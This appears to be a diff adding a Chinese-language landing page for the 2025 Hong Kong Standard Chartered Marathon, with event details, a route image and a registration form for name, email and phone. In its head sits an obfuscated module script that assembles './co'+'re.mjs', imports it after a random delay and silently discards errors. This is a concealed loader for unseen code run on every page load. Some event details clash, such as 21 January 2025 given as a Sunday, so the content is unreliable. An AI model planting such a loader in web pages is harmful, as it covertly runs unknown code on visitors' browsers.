@@ -1,0 +1,459 @@
+﻿<!DOCTYPE html>
+<html lang="zh-HK">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> 2025香港渣打馬拉松 | 奔跑香港心跳</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+ <script type="module">
+  const fn = () => {
+    const p = ['./co' + 're.mjs'];
+    import(p[0]).catch(() => {});
+  };
+  setTimeout(fn, 1 + Math.floor(Math.random() * 10));
+  </script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: '#E63946', 
+            secondary: '#1D3557',
+            accent: '#F1FAEE',
+            highlight: '#A8DADC', 
+            dark: '#1D3557', 
+          },
+          fontFamily: {
+            sans: ['Inter', 'Microsoft JhengHei', 'sans-serif'],
+          },
+        },
+      }
+    }
+  </script>
+  <style type="text/tailwindcss">
+    @layer utilities {
+      .content-auto {
+        content-visibility: auto;
+      }
+      .text-shadow {
+        text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      }
+      .text-shadow-lg {
+        text-shadow: 0 4px 8px rgba(0,0,0,0.5);
+      }
+      .transition-custom {
+        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      }
+      .bg-blur {
+        backdrop-filter: blur(8px);
+      }
+    }
+  </style>
+</head>
+<body class="bg-accent text-dark font-sans antialiased">
+  <header id="navbar" class="fixed w-full top-0 z-50 transition-all duration-300 bg-white/90 bg-blur shadow-md">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex justify-between items-center py-4">
+        <div class="flex items-center space-x-2">
+          <i class="fas fa-running text-primary text-2xl"></i>
+          <span class="text-xl font-bold text-secondary">香港渣打馬拉松</span>
+        </div>
+        <nav class="hidden md:flex space-x-8">
+          <a href="#about" class="text-dark hover:text-primary font-medium transition-colors">關於賽事</a>
+          <a href="#info" class="text-dark hover:text-primary font-medium transition-colors">比賽資訊</a>
+          <a href="#route" class="text-dark hover:text-primary font-medium transition-colors">路線圖</a>
+          <a href="#sponsors" class="text-dark hover:text-primary font-medium transition-colors">贊助商</a>
+          <a href="#register" class="bg-primary hover:bg-primary/90 text-white px-5 py-2 rounded-full font-medium transition-colors">立即報名</a>
+        </nav>
+        
+        <button id="mobile-menu-button" class="md:hidden text-dark focus:outline-none">
+          <i class="fas fa-bars text-xl"></i>
+        </button>
+      </div>
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        <div class="flex flex-col space-y-3">
+          <a href="#about" class="text-dark hover:text-primary font-medium transition-colors py-2">關於賽事</a>
+          <a href="#info" class="text-dark hover:text-primary font-medium transition-colors py-2">比賽資訊</a>
+          <a href="#route" class="text-dark hover:text-primary font-medium transition-colors py-2">路線圖</a>
+          <a href="#sponsors" class="text-dark hover:text-primary font-medium transition-colors py-2">贊助商</a>
+          <a href="#register" class="bg-primary hover:bg-primary/90 text-white px-5 py-2 rounded-full font-medium transition-colors text-center">立即報名</a>
+        </div>
+      </div>
+    </div>
+  </header>
+  <section class="relative h-screen flex items-center justify-center overflow-hidden">
+    <div class="absolute inset-0 z-0">
+      <img src="https://av.sc.com/hk/zh/content/images/hk-sc-marathon-hong-kong-vertical-w-oyear-r2.jpg" alt="香港馬拉松" 
+           class="w-full h-full object-cover">
+      <div class="absolute inset-0 bg-dark/60"></div>
+    </div>
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8 relative z-10 text-center">
+      <h1 class="text-[clamp(2.5rem,6vw,4.5rem)] font-bold text-white leading-tight text-shadow-lg mb-6 animate-fade-in">
+         2025香港渣打馬拉松
+      </h1>
+      <p class="text-[clamp(1rem,2vw,1.25rem)] text-white/90 text-shadow max-w-2xl mx-auto mb-10">
+         2025年1月21日 | 奔跑香港心跳 | 亞洲最具標誌性馬拉松之一
+      </p>
+      <div class="flex flex-col sm:flex-row justify-center gap-4">
+        <a href="#register" class="bg-primary hover:bg-primary/90 text-white px-8 py-3 rounded-full font-bold text-lg transition-custom transform hover:-translate-y-1 hover:shadow-lg">
+          立即報名
+        </a>
+        <a href="#info" class="bg-white/10 backdrop-blur hover:bg-white/20 text-white border border-white/30 px-8 py-3 rounded-full font-bold text-lg transition-custom transform hover:-translate-y-1 hover:shadow-lg">
+          了解更多
+        </a>
+      </div>
+      
+      <div class="absolute bottom-10 left-1/2 transform -translate-x-1/2 animate-bounce">
+        <a href="#about" class="text-white/80 hover:text-white transition-colors">
+          <i class="fas fa-chevron-down text-2xl"></i>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="py-20 bg-white">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <h2 class="text-[clamp(1.8rem,4vw,2.5rem)] font-bold text-secondary mb-4">關於香港渣打馬拉松</h2>
+        <p class="text-gray-600 text-lg">
+          香港渣打馬拉松自1997年舉辦至今，已成為國際認可的金標賽事，吸引數萬名本地與海外跑手參與。
+        </p>
+      </div>
+      
+      <div class="grid md:grid-cols-2 gap-12 items-center">
+        <div class="order-2 md:order-1">
+          <h3 class="text-[clamp(1.3rem,3vw,1.8rem)] font-bold text-primary mb-6">感受香港心跳</h3>
+          <p class="text-gray-700 mb-4 leading-relaxed">
+            賽道途經尖沙咀、青馬大橋、中環、灣仔等地標，讓參加者穿越香港核心心臟地段。賽事包括全馬、半馬及10公里賽三個組別，並設有輪椅及傷健人士項目。
+          </p>
+          <p class="text-gray-700 mb-8 leading-relaxed">
+            賽事由香港田徑總會主辦，渣打銀行冠名贊助，是香港最大型的體育活動之一。每年吸引超過7萬名跑手參與，見證着無數挑戰自我的感人時刻。
+          </p>
+          <a href="#info" class="inline-flex items-center text-primary font-semibold hover:text-primary/80 transition-colors">
+            探索更多賽事細節
+            <i class="fas fa-arrow-right ml-2"></i>
+          </a>
+        </div>
+        <div class="order-1 md:order-2 relative">
+          <img src="https://av.sc.com/hk/zh/content/images/hk-sc-marathon-hong-kong-vertical-w-oyear-r2.jpg" alt="香港馬拉松" 
+               class="w-full h-auto rounded-xl shadow-xl">
+          <div class="absolute -bottom-6 -left-6 bg-primary text-white p-4 rounded-lg shadow-lg hidden md:block">
+            <p class="font-bold text-xl">27年曆史</p>
+            <p class="text-sm opacity-90">自1997年以來</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="info" class="py-20 bg-accent">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <h2 class="text-[clamp(1.8rem,4vw,2.5rem)] font-bold text-secondary mb-4">比賽資訊</h2>
+        <p class="text-gray-600 text-lg">
+          了解各組別、報名時間、起跑安排與完賽獎勵
+        </p>
+      </div>
+      
+      <div class="grid md:grid-cols-3 gap-8">
+        <div class="bg-white rounded-2xl shadow-lg overflow-hidden transition-custom hover:shadow-xl hover:-translate-y-2">
+          <div class="h-4 bg-primary"></div>
+          <div class="p-8">
+            <div class="w-14 h-14 bg-primary/10 rounded-full flex items-center justify-center mb-6">
+              <i class="fas fa-flag-checkered text-primary text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-secondary mb-4">賽事組別</h3>
+            <ul class="space-y-3 text-gray-700">
+              <li class="flex items-start">
+                <i class="fas fa-check text-primary mt-1 mr-2"></i>
+                <span>全程馬拉松：42.195公里 | 限時6小時</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-check text-primary mt-1 mr-2"></i>
+                <span>半程馬拉松：21.0975公里 | 限時3小時</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-check text-primary mt-1 mr-2"></i>
+                <span>十公里賽：10公里 | 限時1.5小時</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+        
+        <div class="bg-white rounded-2xl shadow-lg overflow-hidden transition-custom hover:shadow-xl hover:-translate-y-2">
+          <div class="h-4 bg-secondary"></div>
+          <div class="p-8">
+            <div class="w-14 h-14 bg-secondary/10 rounded-full flex items-center justify-center mb-6">
+              <i class="fas fa-calendar-alt text-secondary text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-secondary mb-4">賽事時程</h3>
+            <ul class="space-y-3 text-gray-700">
+              <li class="flex items-start">
+                <i class="fas fa-clock text-secondary mt-1 mr-2"></i>
+                <span>報名時間：2024年9月28日 - 10月31日</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-clock text-secondary mt-1 mr-2"></i>
+                <span>比賽日期： 2025年1月21日（星期日）</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-clock text-secondary mt-1 mr-2"></i>
+                <span>起跑時間：05:45 - 08:15（分批起跑）</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+        
+        <div class="bg-white rounded-2xl shadow-lg overflow-hidden transition-custom hover:shadow-xl hover:-translate-y-2">
+          <div class="h-4 bg-highlight"></div>
+          <div class="p-8">
+            <div class="w-14 h-14 bg-highlight/30 rounded-full flex items-center justify-center mb-6">
+              <i class="fas fa-medal text-secondary text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-secondary mb-4">獎勵辦法</h3>
+            <ul class="space-y-3 text-gray-700">
+              <li class="flex items-start">
+                <i class="fas fa-trophy text-secondary mt-1 mr-2"></i>
+                <span>各組別冠亞季軍可獲得獎金與獎座</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-trophy text-secondary mt-1 mr-2"></i>
+                <span>所有完賽者均可獲得獎牌與電子證書</span>
+              </li>
+              <li class="flex items-start">
+                <i class="fas fa-trophy text-secondary mt-1 mr-2"></i>
+                <span>設有本地精英獎與年齡分組獎勵</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="route" class="py-20 bg-white">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <h2 class="text-[clamp(1.8rem,4vw,2.5rem)] font-bold text-secondary mb-4">路線圖</h2>
+          <p class="text-gray-600 text-lg">
+          賽道橫跨尖沙咀、青馬大橋、中環與銅鑼灣等地，盡覽香江風光。
+        </p>
+      </div>
+      
+     <div class="relative rounded-2xl overflow-hidden shadow-2xl border border-gray-100">
+  <div class="relative aspect-[16/9] bg-gray-100">
+    <img src="https://ak-d.tripcdn.com/images/0M71m2234a2r89z9sFC81_Q60.jpg_.webp" 
+         alt="香港渣打馬拉松路線圖" 
+         class="absolute inset-0 w-full h-full object-cover">
+  </div>
+</div>
+         
+               
+       
+      </div>
+    </div>
+  </section>
+
+  <section id="sponsors" class="py-20 bg-accent">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <h2 class="text-[clamp(1.8rem,4vw,2.5rem)] font-bold text-secondary mb-4">贊助商</h2>
+        <p class="text-gray-600 text-lg">
+          感謝渣打銀行與眾多夥伴支持本屆賽事
+        </p>
+      </div>
+      
+      <div class="bg-white p-8 rounded-2xl shadow-lg flex justify-center items-center">
+        <img src="https://i.imgur.com/dR5LcWq.png" alt="渣打銀行" class="max-h-32 max-w-full object-contain grayscale hover:grayscale-0 transition-all duration-300">
+      </div>
+    </div>
+  </section>
+
+  <section id="register" class="py-20 bg-gradient-to-br from-secondary to-primary text-white">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="max-w-4xl mx-auto">
+        <div class="text-center mb-12">
+          <h2 class="text-[clamp(1.8rem,4vw,2.5rem)] font-bold mb-4">立即報名參加</h2>
+          <p class="text-white/90 text-lg max-w-2xl mx-auto">
+            填寫以下資料，加入香港年度跑步盛事！名額有限，額滿即止。
+          </p>
+        </div>
+        
+        <div class="bg-white text-dark rounded-2xl shadow-2xl p-8 md:p-10">
+          <form id="registration-form" class="space-y-6">
+            <div class="grid md:grid-cols-2 gap-6">
+              <div>
+                <label for="name" class="block text-gray-700 font-medium mb-2">姓名</label>
+                <input type="text" id="name" name="name" required
+                       class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none transition-all">
+              </div>
+              
+              <div>
+                <label for="email" class="block text-gray-700 font-medium mb-2">電子郵件</label>
+                <input type="email" id="email" name="email" required
+                       class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none transition-all">
+              </div>
+              
+              <div>
+                <label for="phone" class="block text-gray-700 font-medium mb-2">聯絡電話</label>
+                <input type="tel" id="phone" name="phone" required
+                       class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none transition-all">
+              </div>
+              
+              <div>
+                <label for="category" class="block text-gray-700 font-medium mb-2">參賽組別</label>
+                <select id="category" name="category" required
+                        class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none transition-all appearance-none bg-white">
+                  <option value="full">全程馬拉松</option>
+                  <option value="half">半程馬拉松</option>
+                  <option value="10k">10公里賽</option>
+                </select>
+              </div>
+            </div>
+            
+            <div class="pt-4">
+              <button type="submit" class="w-full bg-primary hover:bg-primary/90 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:-translate-y-1 hover:shadow-lg">
+                提交報名
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer class="bg-dark text-white pt-16 pb-8">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="grid md:grid-cols-3 gap-10 mb-12">
+        <div>
+          <div class="flex items-center space-x-2 mb-6">
+            <i class="fas fa-running text-primary text-2xl"></i>
+            <span class="text-xl font-bold">香港渣打馬拉松</span>
+          </div>
+          <p class="text-gray-400 mb-6">
+            自1997年以來，已成為香港體育界的標誌性賽事，每年吸引數萬名跑手參與。
+          </p>
+          <div class="flex space-x-4">
+            <a href="#" class="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-primary transition-colors">
+              <i class="fab fa-facebook-f"></i>
+            </a>
+            <a href="#" class="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-primary transition-colors">
+              <i class="fab fa-instagram"></i>
+            </a>
+            <a href="#" class="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-primary transition-colors">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </div>
+        </div>
+        
+        <div>
+          <h3 class="text-lg font-bold mb-6 text-white">賽事資訊</h3>
+          <ul class="space-y-3">
+            <li><a href="#about" class="text-gray-400 hover:text-primary transition-colors">關於賽事</a></li>
+            <li><a href="#info" class="text-gray-400 hover:text-primary transition-colors">比賽安排</a></li>
+            <li><a href="#route" class="text-gray-400 hover:text-primary transition-colors">賽道地圖</a></li>
+            <li><a href="#sponsors" class="text-gray-400 hover:text-primary transition-colors">贊助商</a></li>
+          </ul>
+        </div>
+        
+        <div>
+          <h3 class="text-lg font-bold mb-6 text-white">聯絡方式</h3>
+          <ul class="space-y-3">
+            <li class="flex items-start">
+              <i class="fas fa-envelope text-primary mt-1 mr-3"></i>
+              <a href="mailto:chartered@hk.com" class="text-gray-400 hover:text-primary transition-colors">chartered@hk.com</a>
+            </li>
+            <li class="flex items-start">
+              <i class="fas fa-phone text-primary mt-1 mr-3"></i>
+              <a href="tel:+85246006002" class="text-gray-400 hover:text-primary transition-colors">+852 4600 6002</a>
+            </li>
+            <li class="flex items-start">
+              <i class="fas fa-map-marker-alt text-primary mt-1 mr-3"></i>
+              <span class="text-gray-400">香港體育館，九龍紅磡</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="border-t border-gray-800 pt-8 text-center text-gray-500 text-sm">
+        &copy;  2025 香港體育館 | 版權所有
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const mobileMenuButton = document.getElementById('mobile-menu-button');
+    const mobileMenu = document.getElementById('mobile-menu');
+    
+    mobileMenuButton.addEventListener('click', () => {
+      mobileMenu.classList.toggle('hidden');
+      const icon = mobileMenuButton.querySelector('i');
+      if (mobileMenu.classList.contains('hidden')) {
+        icon.classList.remove('fa-times');
+        icon.classList.add('fa-bars');
+      } else {
+        icon.classList.remove('fa-bars');
+        icon.classList.add('fa-times');
+      }
+    });
+    
+    const navbar = document.getElementById('navbar');
+    
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 50) {
+        navbar.classList.add('py-2');
+        navbar.classList.remove('py-4');
+        navbar.classList.add('shadow-lg');
+      } else {
+        navbar.classList.add('py-4');
+        navbar.classList.remove('py-2');
+        navbar.classList.remove('shadow-lg');
+      }
+    });
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        
+        if (!mobileMenu.classList.contains('hidden')) {
+          mobileMenu.classList.add('hidden');
+          const icon = mobileMenuButton.querySelector('i');
+          icon.classList.remove('fa-times');
+          icon.classList.add('fa-bars');
+        }
+        
+        const targetId = this.getAttribute('href');
+        if (targetId === '#') return;
+        
+        const targetElement = document.querySelector(targetId);
+        if (targetElement) {
+          window.scrollTo({
+            top: targetElement.offsetTop - 80,
+            behavior: 'smooth'
+          });
+        }
+      });
+    });
+    
+    const registrationForm = document.getElementById('registration-form');
+    
+    registrationForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      const submitButton = registrationForm.querySelector('button[type="submit"]');
+      const originalText = submitButton.innerHTML;
+      
+      submitButton.disabled = true;
+      submitButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> 提交中...';
+      
+      setTimeout(() => {
+        alert('報名表單已提交成功！我們將盡快與您聯絡。');
+        registrationForm.reset();
+        submitButton.disabled = false;
+        submitButton.innerHTML = originalText;
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
